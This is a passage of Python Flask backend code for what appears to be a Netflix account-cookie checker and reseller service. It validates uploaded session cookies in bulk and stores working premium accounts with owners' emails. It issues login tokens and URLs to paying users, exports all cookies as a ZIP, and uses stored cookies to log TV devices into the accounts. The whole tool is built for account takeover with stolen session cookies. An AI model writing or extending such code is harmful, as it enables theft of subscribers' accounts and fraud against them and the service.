            return jsonify({'status': 'error', 'message': 'Email and password required'})
        
        auth_response = supabase.auth.sign_in_with_password({
            "email": email,
            "password": password
        })
        
        profile = supabase.table('user_profiles').select('*').eq('id', auth_response.user.id).single().execute()
        
        is_admin = (email in SUPER_ADMIN_EMAILS or 
                   str(auth_response.user.id) in SUPER_ADMIN_IDS or
                   profile.data.get('is_super_admin', False))
        
        if is_admin and not profile.data.get('is_super_admin', False):
            supabase.table('user_profiles').update({
                'is_super_admin': True,
                'role': 'super_admin'
            }).eq('id', auth_response.user.id).execute()
        
        return jsonify({
            'status': 'success',
            'session': {
                'access_token': auth_response.session.access_token,
                'refresh_token': auth_response.session.refresh_token,
                'expires_at': auth_response.session.expires_at
            },
            'user': {
                'id': auth_response.user.id,
                'email': auth_response.user.email,
                'is_premium': profile.data.get('is_premium', False),
                'is_super_admin': is_admin,
                'role': 'super_admin' if is_admin else profile.data.get('role', 'user')
            }
        })
    except AuthApiError as e:
        return jsonify({'status': 'error', 'message': 'Invalid credentials'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/auth/logout', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def logout(user):
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        supabase.auth.sign_out()
        return jsonify({'status': 'success', 'message': 'Logged out successfully'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/auth/me', methods=['GET', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def get_current_user(user):
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        profile = supabase.table('user_profiles').select('*').eq('id', user.id).single().execute()
        return jsonify({
            'status': 'success',
            'user': {
                'id': user.id,
                'email': user.email,
                'is_premium': profile.data.get('is_premium', False) if profile.data else False
            }
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/export/netflix-ids', methods=['GET', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_super_admin
def export_netflix_ids(user):
    if request.method == 'OPTIONS':
        return '', 204

    try:
        all_ids = []
        limit = 1000
        offset = 0

        while True:
            result = supabase.table('netflix_accounts')\
                .select('netflix_id')\
                .eq('is_active', True)\
                .limit(limit)\
                .offset(offset)\
                .execute()

            batch = [acc['netflix_id'] for acc in (result.data or []) if acc.get('netflix_id')]
            all_ids.extend(batch)

            if len(batch) < limit:
                break

            offset += limit

        if not all_ids:
            return jsonify({"status": "error", "message": "No active accounts found"}), 404

        # Create ZIP file with one txt per NetflixId
        memory_file = io.BytesIO()
        with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
            for idx, netflix_id in enumerate(all_ids, 1):
                content = f"NetflixId={netflix_id}\n"
                filename = f"NetflixId_{idx:04d}.txt"
                zf.writestr(filename, content)

        memory_file.seek(0)

        response = Response(memory_file.getvalue(), mimetype='application/zip')
        response.headers['Content-Disposition'] = 'attachment; filename=netflix_ids_to_recheck.zip'
        response.headers['Content-Length'] = str(len(memory_file.getvalue()))
        return response

    except Exception as e:
        logger.error(f"Export ZIP error: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)}), 500
        
@app.route('/api/check', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def check_cookie(user):
    if request.method == 'OPTIONS':
        return '', 204
    
    data, errors = validate_input(request.get_json())
    if errors:
        return jsonify({'status': 'error', 'message': 'Invalid input', 'errors': errors}), 400
        
    try:
        content = data.get('content', '')
        mode = data.get('mode', 'check_only')
        
        if not content:
            return jsonify({'status': 'error', 'message': 'No content provided'})
        
        # Extract BOTH credentials
        credentials = extract_netflix_credentials(content)
        if not credentials:
            return jsonify({'status': 'error', 'message': 'No NetflixId found'})
        
        netflix_id = credentials['netflix_id']
        secure_netflix_id = credentials['secure_netflix_id']
        
        # Build cookie dict with BOTH IDs
        cookie_dict = {"NetflixId": netflix_id}
        if secure_netflix_id:
            cookie_dict["SecureNetflixId"] = secure_netflix_id
        
        account_info = check_netflix_cookie(cookie_dict)
        
        if not account_info["ok"]:
            return jsonify({
                "status": "error",
                "message": account_info.get('err', 'Invalid account')
            })
        
        is_premium_user = check_premium_status(user.id)
        is_admin = is_super_admin(user.id)
        
        is_ph_premium = (account_info["country"] == "PH" and 
                        account_info["premium"] and 
                        "Premium" in account_info.get("plan", ""))
        
        account_db_id = None
        if account_info["ok"] and account_info["premium"]:
            can_be_exclusive = is_admin and is_ph_premium
            
            success, db_record = store_netflix_account(
                email=account_info["email"],
                netflix_id=netflix_id,
                secure_netflix_id=secure_netflix_id,  # NEW
                subscription_type=account_info["subscription_type"],
                country=account_info["country"],
                plan=account_info["plan"],
                cookie_content=content,
                user_id=user.id,
                signup_country=account_info.get("signup_country"),
                detection_method=account_info.get("detection_method"),
                is_exclusive=can_be_exclusive if 'can_be_exclusive' in locals() else False,
                reserved_for_admin=can_be_exclusive if 'can_be_exclusive' in locals() else False,
                next_billing_date=account_info.get('next_billing_date'),
                days_until_billing=account_info.get('days_until_billing'),
                is_expired=account_info.get('is_expired', False)
            )
            if success and db_record:
                account_db_id = db_record.get('id')
        
        if mode == 'generate_token' and not is_premium_user:
            return jsonify({
                "status": "error",
                "message": "Premium subscription required to generate tokens"
            }), 403
        
        if mode == 'check_only':
            if account_db_id:
                log_token_generation(
                    account_id=account_db_id,
                    user_id=user.id,
                    ip_address=request.remote_addr,
                    token=None
                )
            
            return jsonify({
                "status": "success",
                "data": {
                    "email": account_info["email"],
                    "country": account_info["country"],
                    "plan": account_info["plan"],
                    "is_premium": account_info["premium"],
                    "subscription_type": account_info["subscription_type"],
                    "mode": "check_only",
                    "stored_in_db": account_info["ok"] and account_info["premium"],
                    "is_exclusive": is_ph_premium and not is_admin
                }
            })
        
        token_result = generate_token(netflix_id,secure_netflix_id)
        
        if token_result["status"] != "Success":
            return jsonify({
                "status": "error",
                "message": "Failed to generate token"
            })
        
        if account_db_id:
            log_token_generation(
                account_id=account_db_id,
                user_id=user.id,
                ip_address=request.remote_addr,
                token=token_result["token"]
            )
        
        return jsonify({
            "status": "success",
            "data": {
                "email": account_info["email"],
                "country": account_info["country"],
                "plan": account_info["plan"],
                "is_premium": account_info["premium"],
                "subscription_type": account_info["subscription_type"],
                "token": token_result["token"],
                "expires": token_result["expires"],
                "login_urls": token_result["login_urls"],
                "mode": "generate_token"
            }
        })
            
    except Exception as e:
        logger.error(f"Error in check_cookie: {str(e)}")
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/batch-check', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def batch_check(user):
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    temp_dirs = []
    
    try:
        files = request.files.getlist('files')
        mode = request.form.get('mode', 'check_only')
        
        if not files:
            return jsonify({'status': 'error', 'message': 'No files provided'}), 400
        
        is_premium_user = check_premium_status(user.id)
        
        if mode == 'generate_token' and not is_premium_user:
            return jsonify({
                "status": "error",
                "message": "Premium subscription required to generate tokens"
            }), 403
        
        results = []
        total_files = len(files)
        
        def generate_progress():
            nonlocal results
            
            for index, file in enumerate(files, 1):
                filename = file.filename
                progress_data = {
                    'type': 'progress',
                    'current': index,
                    'total': total_files,
                    'filename': filename,
                    'percent': int((index / total_files) * 100)
                }
                yield f"data: {json.dumps(progress_data)}\n\n"
                
                result = process_single_file(file, mode, is_premium_user, user.id)
                results.append(result)
                
                result_data = {
                    'type': 'result',
                    'result': result,
                    'current': index,
                    'total': total_files
                }
                yield f"data: {json.dumps(result_data)}\n\n"
            
            completion_data = {
                'type': 'complete',
                'results': results,
                'summary': {
                    'total': len(results),
                    'valid': len([r for r in results if r['status'] == 'success']),
                    'invalid': len([r for r in results if r['status'] == 'error'])
                }
            }
            yield f"data: {json.dumps(completion_data)}\n\n"
        
        if request.headers.get('Accept') == 'application/json':
            for file in files:
                result = process_single_file(file, mode, is_premium_user, user.id)
                results.append(result)
            
            return jsonify({
                "status": "success",
                "results": results
            })
        
        return Response(
            stream_with_context(generate_progress()),
            mimetype='text/event-stream',
            headers={
                'Cache-Control': 'no-cache',
                'X-Accel-Buffering': 'no'
            }
        )
        
    except Exception as e:
        logger.error(f"Batch check error: {str(e)}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)}), 500
    
    finally:
        for temp_dir in temp_dirs:
            try:
                shutil.rmtree(temp_dir)
            except:
                pass

def process_single_file(file, mode, is_premium_user, user_id):
    filename = file.filename
    
    try:
        if filename.lower().endswith('.zip'):
            unique_dir = tempfile.mkdtemp(prefix=f"batch_", dir=TEMP_DIR)
            zip_path = os.path.join(unique_dir, filename)
            file.save(zip_path)
            txt_files = extract_zip_and_get_files(zip_path, unique_dir)
            
            if txt_files:
                with open(txt_files[0], 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                return process_content(content, os.path.basename(txt_files[0]), mode, is_premium_user, user_id)
            else:
                return {
                    "status": "error", 
                    "filename": filename, 
                    "message": "No text files found in ZIP"
                }
        
        elif filename.lower().endswith('.txt'):
            content = file.read().decode('utf-8', errors='ignore')
            return process_content(content, filename, mode, is_premium_user, user_id)
        
        else:
            return {
                "status": "error", 
                "filename": filename, 
                "message": "Unsupported file type"
            }
            
    except Exception as e:
        return {
            "status": "error", 
            "filename": filename, 
            "message": str(e)
        }

def process_content(content, filename, mode, is_premium_user, user_id):
    netflix_id = extract_netflix_id(content)
    
    if not netflix_id:
        return {
            "status": "error", 
            "filename": filename, 
            "message": "No NetflixId found"
        }
    
    account_info = check_netflix_cookie({"NetflixId": netflix_id})
    
    if not account_info["ok"]:
        return {
            "status": "error", 
            "filename": filename, 
            "message": account_info.get('err', 'Invalid account')
        }
    
    if account_info["ok"] and account_info.get("premium"):
        store_netflix_account(
            email=account_info["email"],
            netflix_id=netflix_id,
            subscription_type=account_info["subscription_type"],
            country=account_info["country"],
            plan=account_info["plan"],
            cookie_content=content,
            user_id=user_id,
            signup_country=account_info.get("signup_country"),
            detection_method=account_info.get("detection_method"),
            next_billing_date=account_info.get("next_billing_date"),
            days_until_billing=account_info.get("days_until_billing"),
            is_expired=account_info.get("is_expired", False)
        )
    
    result_data = {
        "status": "success",
        "filename": filename,
        "email": account_info["email"],
        "country": account_info["country"],
        "plan": account_info["plan"],
        "is_premium": account_info["premium"],
        "subscription_type": account_info["subscription_type"],
        "mode": mode,
        "stored_in_db": account_info["ok"] and account_info["premium"]
    }
    
    if mode == 'generate_token' and is_premium_user:
        token_result = generate_token(netflix_id)
        if token_result["status"] == "Success":
            result_data["token"] = token_result["token"]
            result_data["expires"] = token_result["expires"]
            result_data["login_urls"] = token_result["login_urls"]
        else:
            result_data["token_error"] = token_result.get("error", "Failed")
    
    return result_data

@app.route('/api/accounts', methods=['GET', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def get_accounts(user):
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        is_premium = check_premium_status(user.id)
        is_admin = is_super_admin(user.id)
        
        logger.info(f"User {user.id} accessing accounts. Premium: {is_premium}, Admin: {is_admin}")
        
        if not is_premium and not is_admin:
            return jsonify({
                "status": "error",
                "message": "Premium subscription required to view accounts"
            }), 403
        
        # SAME FILTER FOR EVERYONE: only active, premium, non-expired accounts
        query = supabase.table('netflix_accounts')\
            .select('*')\
            .eq('is_active', True)\
            .eq('is_premium', True)\
            .eq('is_expired', False)\
        
        country_filter = request.args.get('country')
        if country_filter:
            query = query.eq('country', country_filter)
        
        query = query.order('created_at', desc=True)
        accounts = query.execute()
        
        if is_admin:
            ph_count = ensure_ph_accounts_pool()
            logger.info(f"Super admin {user.id} accessed accounts. PH pool: {ph_count}")
        
        safe_accounts = []
        for acc in accounts.data or []:
            # Extra safety: skip anything that slipped through with negative billing
            days_left = acc.get('days_until_billing')
            if days_left is not None and days_left < -3:
                continue
            
            account_data = {
                'id': acc['id'],
                'email': acc['email'],
                'subscription_type': acc['subscription_type'],
                'country': acc['country'],
                'plan': acc['plan'],
                'created_at': acc['created_at'],
                'last_checked': acc['last_checked'],
                'secure_netflix_id': acc['secure_netflix_id'],
                'days_until_billing': days_left,
                'next_billing_date': acc.get('next_billing_date')
            }
            
            # Admins see extra metadata (but same filtered accounts)
            if is_admin:
                account_data['is_exclusive'] = acc.get('exclusive_access', False)
                account_data['reserved_for_super_admin'] = acc.get('reserved_for_super_admin', False)
                account_data['is_expired'] = acc.get('is_expired', False)
                account_data['added_by'] = acc.get('added_by')
            
            safe_accounts.append(account_data)
        
        return jsonify({
            "status": "success",
            "accounts": safe_accounts,
            "is_super_admin": is_admin,
            "total_count": len(safe_accounts)
        })
        
    except Exception as e:
        logger.error(f"Error getting accounts: {str(e)}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/accounts/exclusive', methods=['GET', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_super_admin
def get_exclusive_accounts(user):
    """Get accounts reserved for super admin only"""
    if request.method == 'OPTIONS':
        return '', 204
    
    try:
        accounts = supabase.table('netflix_accounts')\
            .select('*')\
            .or_('exclusive_access.eq.true,reserved_for_super_admin.eq.true')\
            .eq('is_active', True)\
            .order('created_at', desc=True)\
            .execute()
        
        ph_accounts = [a for a in (accounts.data or []) if a.get('country') == 'PH']
        other_accounts = [a for a in (accounts.data or []) if a.get('country') != 'PH']
        
        return jsonify({
            "status": "success",
            "ph_accounts": {
                "count": len(ph_accounts),
                "accounts": ph_accounts[:20]
            },
            "other_exclusive": other_accounts[:20],
            "ph_minimum_met": len(ph_accounts) >= 8,
            "is_super_admin": True
        })
        
    except Exception as e:
        logger.error(f"Error getting exclusive accounts: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/accounts/<account_id>/set-exclusive', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_super_admin
def set_account_exclusive(user, account_id):
    """Mark an account as exclusive/super-admin-only"""
    if request.method == 'OPTIONS':
        return '', 204
    
    try:
        data = request.get_json()
        is_exclusive = data.get('exclusive_access', False)
        reserved_for_admin = data.get('reserved_for_super_admin', False)
        
        result = supabase.table('netflix_accounts')\
            .update({
                'exclusive_access': is_exclusive,
                'reserved_for_super_admin': reserved_for_admin,
                'updated_at': datetime.utcnow().isoformat()
            })\
            .eq('id', account_id)\
            .execute()
        
        if result.data:
            return jsonify({
                "status": "success",
                "message": "Account exclusivity updated",
                "account": result.data[0]
            })
        else:
            return jsonify({"status": "error", "message": "Account not found"}), 404
            
    except Exception as e:
        logger.error(f"Error setting exclusivity: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/accounts/<account_id>/generate-token', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def generate_account_token(user, account_id):
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        is_premium = check_premium_status(user.id)
        
        if not is_premium:
            return jsonify({
                "status": "error",
                "message": "Premium subscription required"
            }), 403
        
        account = supabase.table('netflix_accounts')\
            .select('*')\
            .eq('id', account_id)\
            .eq('is_active', True)\
            .single()\
            .execute()
        
        if not account.data:
            return jsonify({
                "status": "error",
                "message": "Account not found"
            }), 404
        
        netflix_id = account.data.get('netflix_id')
        
        if not netflix_id:
            return jsonify({
                "status": "error",
                "message": "Invalid account data"
            })
        
        token_result = generate_token(netflix_id)
        
        if token_result["status"] != "Success":
            return jsonify({
                "status": "error",
                "message": "Failed to generate token"
            })
        
        log_token_generation(
            account_id=account_id,
            user_id=user.id,
            ip_address=request.remote_addr
        )
        
        return jsonify({
            "status": "success",
            "data": {
                "email": account.data['email'],
                "subscription_type": account.data['subscription_type'],
                "token": token_result["token"],
                "expires": token_result["expires"],
                "login_urls": token_result["login_urls"]
            }
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({
        "status": "ok",
        "env_vars_set": {
            "SUPABASE_URL": bool(os.environ.get('SUPABASE_URL')),
            "SUPABASE_SERVICE_KEY": bool(os.environ.get('SUPABASE_SERVICE_KEY')),
            "FLASK_SECRET_KEY": bool(os.environ.get('FLASK_SECRET_KEY'))
        }
    })

@app.route('/api/cron/validate-accounts', methods=['GET', 'POST'])
def cron_validate_accounts():
    cron_secret = os.environ.get('CRON_SECRET')
    auth_header = request.headers.get('Authorization', '')
    
    is_vercel = (
        request.headers.get('User-Agent') == 'Vercel Cron' or
        (cron_secret and auth_header == f"Bearer {cron_secret}") or
        request.headers.get('x-vercel-signature') is not None
    )
    
    if not is_vercel and os.environ.get('VERCEL_ENV') == 'production':
        return jsonify({'status': 'unauthorized'}), 401
    
    try:
        headers = {
            'apikey': SUPABASE_SERVICE_KEY,
            'Authorization': f'Bearer {SUPABASE_SERVICE_KEY}',
            'Content-Type': 'application/json',
            'Prefer': 'return=minimal'
        }
        
        fetch_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&is_active=eq.true"
        fetch_resp = requests.get(fetch_url, headers=headers, timeout=30)
        
        if fetch_resp.status_code != 200:
            return jsonify({'status': 'error', 'message': f'Fetch failed: {fetch_resp.status_code}'}), 500
        
        accounts = fetch_resp.json()
        
        if not accounts:
            return jsonify({'status': 'success', 'message': 'No accounts to check', 'checked': 0})
        
        results = {'valid': 0, 'invalid': 0, 'updated': 0, 'errors': []}
        
        for account in accounts:
            try:
                netflix_id = account.get('netflix_id')
                if not netflix_id:
                    continue
                
                account_info = check_netflix_cookie({"NetflixId": netflix_id})
                
                # CRITICAL FIX: Same validation logic as bulk recheck
                is_valid = account_info.get('ok', False)
                error_reason = account_info.get('err', 'Unknown error')
                
                # Safety checks
                if is_valid and (not account_info.get('email') or account_info.get('email') == 'Unknown'):
                    is_valid = False
                    error_reason = 'Incomplete account data'
                
                if is_valid and account_info.get('plan') == 'Unknown' and not account_info.get('premium', False):
                    is_valid = False
                    error_reason = 'Unknown plan, likely expired'
                
                if is_valid:
                    update_data = {
                        'last_checked': datetime.utcnow().isoformat(),
                        'plan': account_info['plan'],
                        'subscription_type': account_info['subscription_type'],
                        'country': account_info['country'],
                        'is_active': True,
                        'is_premium': account_info['premium'],
                        'next_billing_date': account_info.get('next_billing_date'),
                        'days_until_billing': account_info.get('days_until_billing'),
                        'is_expired': False,
                        'deactivated_reason': None,
                        'deactivated_at': None
                    }
                    
                    update_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?id=eq.{account['id']}"
                    requests.patch(update_url, headers=headers, json=update_data, timeout=30)
                    
                    results['valid'] += 1
                    results['updated'] += 1
                    
                else:
                    update_data = {
                        'is_active': False,
                        'last_checked': datetime.utcnow().isoformat(),
                        'deactivated_reason': error_reason,
                        'deactivated_at': datetime.utcnow().isoformat(),
                        'is_expired': True,
                        'is_premium': False
                    }
                    
                    update_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?id=eq.{account['id']}"
                    requests.patch(update_url, headers=headers, json=update_data, timeout=30)
                    
                    results['invalid'] += 1
                    
                time.sleep(1.5)
                
            except Exception as e:
                results['errors'].append({'account_id': account['id'], 'error': str(e)})
                logger.error(f"Error checking account {account['id']}: {e}")
                continue
        
        return jsonify({
            'status': 'success',
            'checked': len(accounts),
            'results': results
        })
        
    except Exception as e:
        logger.error(f"Cron job failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/admin/bulk-recheck', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_super_admin
def bulk_recheck_accounts(user):
    """Process accounts in chunks like batch-check, return JSON (not SSE)"""
    if request.method == 'OPTIONS':
        return '', 204

    try:
        headers = {
            'apikey': SUPABASE_SERVICE_KEY,
            'Authorization': f'Bearer {SUPABASE_SERVICE_KEY}',
            'Content-Type': 'application/json',
            'Prefer': 'return=minimal'
        }
        
        data = request.get_json() or {}
        chunk_size = data.get('chunk_size', 15)
        offset = data.get('offset', 0)
        
        fetch_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&is_active=eq.true&order=created_at.desc&limit={chunk_size}&offset={offset}"
        fetch_resp = requests.get(fetch_url, headers=headers, timeout=30)
        
        if fetch_resp.status_code != 200:
            return jsonify({'status': 'error', 'message': f'Failed to fetch: {fetch_resp.status_code}'}), 500
        
        accounts = fetch_resp.json()
        
        if not accounts:
            return jsonify({
                'status': 'complete',
                'message': 'No more accounts to process',
                'chunk': [],
                'offset': offset,
                'has_more': False
            })
        
        results = []
        valid_count = 0
        invalid_count = 0
        
        for account in accounts:
            try:
                netflix_id = account.get('netflix_id')
                email = account.get('email', 'Unknown')
                
                if not netflix_id:
                    results.append({
                        'email': email,
                        'status': 'error',
                        'reason': 'Missing NetflixId'
                    })
                    continue

                # Check cookie
                account_info = check_netflix_cookie({"NetflixId": netflix_id})
                
                # CRITICAL FIX: Check both 'ok' AND 'err' keys
                # 'ok' can be False with 'err' explaining why
                is_valid = account_info.get('ok', False)
                error_reason = account_info.get('err', 'Unknown error')
                
                # Additional safety: if ok is True but no email/plan, something is wrong
                if is_valid and (not account_info.get('email') or account_info.get('email') == 'Unknown'):
                    is_valid = False
                    error_reason = 'Incomplete account data (missing email)'
                
                # Additional safety: if ok is True but plan is Unknown and not premium, likely expired
                if is_valid and account_info.get('plan') == 'Unknown' and not account_info.get('premium', False):
                    is_valid = False
                    error_reason = 'Unknown plan, likely expired or invalid'
                
                if is_valid:
                    # Update valid account
                    update_data = {
                        'last_checked': datetime.utcnow().isoformat(),
                        'plan': account_info['plan'],
                        'subscription_type': account_info['subscription_type'],
                        'country': account_info['country'],
                        'is_active': True,
                        'is_premium': account_info['premium'],
                        'next_billing_date': account_info.get('next_billing_date'),
                        'days_until_billing': account_info.get('days_until_billing'),
                        'is_expired': False,
                        'deactivated_reason': None,
                        'deactivated_at': None
                    }
                    
                    update_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?id=eq.{account['id']}"
                    requests.patch(update_url, headers=headers, json=update_data, timeout=30)
                    
                    valid_count += 1
                    results.append({
                        'email': email,
                        'status': 'valid',
                        'plan': account_info['plan'],
                        'country': account_info['country']
                    })
                    
                else:
                    # Mark as inactive - use the error reason from check_netflix_cookie
                    update_data = {
                        'is_active': False,
                        'last_checked': datetime.utcnow().isoformat(),
                        'deactivated_reason': error_reason,
                        'deactivated_at': datetime.utcnow().isoformat(),
                        'is_expired': True,
                        'is_premium': False
                    }
                    
                    update_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?id=eq.{account['id']}"
                    requests.patch(update_url, headers=headers, json=update_data, timeout=30)
                    
                    invalid_count += 1
                    results.append({
                        'email': email,
                        'status': 'invalid',
                        'reason': error_reason
                    })

                time.sleep(1.5)

            except Exception as e:
                logger.error(f"Error checking account {account.get('id')}: {e}")
                results.append({
                    'email': account.get('email', 'Unknown'),
                    'status': 'error',
                    'reason': str(e)[:200]
                })
                continue

        next_offset = offset + len(accounts)
        count_resp = requests.get(
            f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&is_active=eq.true&limit=1&offset={next_offset}",
            headers=headers, timeout=30
        )
        has_more = len(count_resp.json()) > 0 if count_resp.status_code == 200 else False

        return jsonify({
            'status': 'success',
            'chunk': results,
            'offset': offset,
            'next_offset': next_offset,
            'has_more': has_more,
            'chunk_valid': valid_count,
            'chunk_invalid': invalid_count,
            'message': f'Processed {len(results)} accounts. {valid_count} valid, {invalid_count} invalid.'
        })

    except Exception as e:
        logger.error(f"Bulk recheck failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/admin/account-stats', methods=['GET', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_super_admin
def get_account_stats(user):
    """Get quick stats for super admin dashboard"""
    if request.method == 'OPTIONS':
        return '', 204

    try:
        headers = {
            'apikey': SUPABASE_SERVICE_KEY,
            'Authorization': f'Bearer {SUPABASE_SERVICE_KEY}',
            'Content-Type': 'application/json'
        }

        # Total accounts
        total_resp = requests.get(f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&limit=1", 
                                  headers={**headers, 'Prefer': 'count=exact'}, timeout=30)
        total = int(total_resp.headers.get('content-range', '0-0/0').split('/')[1]) if '/' in total_resp.headers.get('content-range', '') else 0

        # Active accounts
        active_resp = requests.get(f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&is_active=eq.true&limit=1", 
                                   headers={**headers, 'Prefer': 'count=exact'}, timeout=30)
        active = int(active_resp.headers.get('content-range', '0-0/0').split('/')[1]) if '/' in active_resp.headers.get('content-range', '') else 0

        # PH accounts
        ph_resp = requests.get(f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&country=eq.PH&is_active=eq.true&limit=1", 
                               headers={**headers, 'Prefer': 'count=exact'}, timeout=30)
        ph_count = int(ph_resp.headers.get('content-range', '0-0/0').split('/')[1]) if '/' in ph_resp.headers.get('content-range', '') else 0

        # Premium accounts
        premium_resp = requests.get(f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&is_premium=eq.true&is_active=eq.true&limit=1", 
                                    headers={**headers, 'Prefer': 'count=exact'}, timeout=30)
        premium_count = int(premium_resp.headers.get('content-range', '0-0/0').split('/')[1]) if '/' in premium_resp.headers.get('content-range', '') else 0

        # Accounts needing recheck (not checked in 7 days)
        seven_days_ago = (datetime.utcnow() - timedelta(days=7)).isoformat()
        old_resp = requests.get(
            f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&last_checked=lt.{seven_days_ago}&is_active=eq.true&limit=1",
            headers={**headers, 'Prefer': 'count=exact'}, timeout=30)
        needs_recheck = int(old_resp.headers.get('content-range', '0-0/0').split('/')[1]) if '/' in old_resp.headers.get('content-range', '') else 0

        return jsonify({
            'status': 'success',
            'stats': {
                'total': total,
                'active': active,
                'inactive': total - active,
                'ph_accounts': ph_count,
                'premium_accounts': premium_count,
                'needs_recheck': needs_recheck,
                'last_updated': datetime.utcnow().isoformat()
            }
        })

    except Exception as e:
        logger.error(f"Stats error: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({'status': 'error', 'message': str(e)}), 500

# End of file - no more function definitions after routes

#--------------------------------------------------------------
def get_val(html, key):
    """Extract JSON value from Netflix HTML"""
    m = re.search(rf'"{re.escape(key)}"\s*:\s*"([^"]+)"', html)
    return m.group(1) if m else None

def get_auth_url(html):
    """Extract authURL from Netflix TV page"""
    input_match = re.search(r'name="authURL"\s+value="([^"]+)"', html)
    if input_match:
        return input_match.group(1)
    return get_val(html, "authURL")


@app.route('/api/tv-auth', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def tv_auth(user):
    """
    TV Device Authentication Flow — FIXED VERSION
    Based on working reference: GET /tv8 → extract authURL → POST /tv8 with payload
    """
    if request.method == 'OPTIONS':
        return '', 204

    try:
        data = request.get_json()
        code = data.get('code', '').strip()
        custom_netflix_id = data.get('netflix_id', '').strip()
        custom_secure_id = data.get('secure_netflix_id', '').strip()

        # Validate code format
        if not code or len(code) != 8 or not code.isdigit():
            return jsonify({
                'status': 'error',
                'message': 'TV code must be exactly 8 digits'
            }), 400

        # STEP 1: Get working Netflix credentials (both IDs required)
        netflix_id = None
        secure_netflix_id = None

        if custom_netflix_id:
            # Validate custom credentials first
            cookie_dict = {"NetflixId": custom_netflix_id}
            if custom_secure_id:
                cookie_dict["SecureNetflixId"] = custom_secure_id
            
            is_valid, info = validate_netflix_cookie_quick(cookie_dict)
            if not is_valid:
                return jsonify({
                    'status': 'error',
                    'message': f'Invalid NetflixId: {info.get("err", "Unknown error")}'
                }), 400
            netflix_id = custom_netflix_id
            secure_netflix_id = custom_secure_id
        else:
            # Find working stored account for this user WITH SecureNetflixId
            account = find_working_account_with_secure_id(user.id)
            if not account:
                return jsonify({
                    'status': 'error',
                    'message': 'No working Netflix accounts found with valid SecureNetflixId. Please check a cookie first.'
                }), 400
            netflix_id = account['netflix_id']
            secure_netflix_id = account.get('secure_netflix_id')

        # STEP 2: Build cookie string for headers
        cookie_str = f"NetflixId={netflix_id}"
        if secure_netflix_id:
            cookie_str += f"; SecureNetflixId={secure_netflix_id}"

        DESKTOP_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

        # ── Step 2a: GET /tv8 to extract authURL ──
        logger.info("Step 1: GET https://www.netflix.com/tv8")
        
        tv8_resp = requests.get(
            "https://www.netflix.com/tv8",
            headers={
                "User-Agent": DESKTOP_UA,
                "Cookie": cookie_str,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
            },
            timeout=30,
            allow_redirects=False  # CRITICAL: Don't follow redirects, check status manually
        )

        # Check for redirect = expired cookie
        if tv8_resp.status_code in (301, 302, 303, 307):
            # Mark cookie as dead
            _mark_cookie_dead(netflix_id, "Cookie expired (redirect on /tv8)")
            return jsonify({
                'status': 'error',
                'message': 'Cookie expired. Please check a new cookie first.',
                'retry': True
            }), 400

        if tv8_resp.status_code != 200:
            _mark_cookie_dead(netflix_id, f"Status {tv8_resp.status_code} on /tv8")
            return jsonify({
                'status': 'error',
                'message': f'Failed to load TV page: HTTP {tv8_resp.status_code}',
                'retry': True
            }), 400

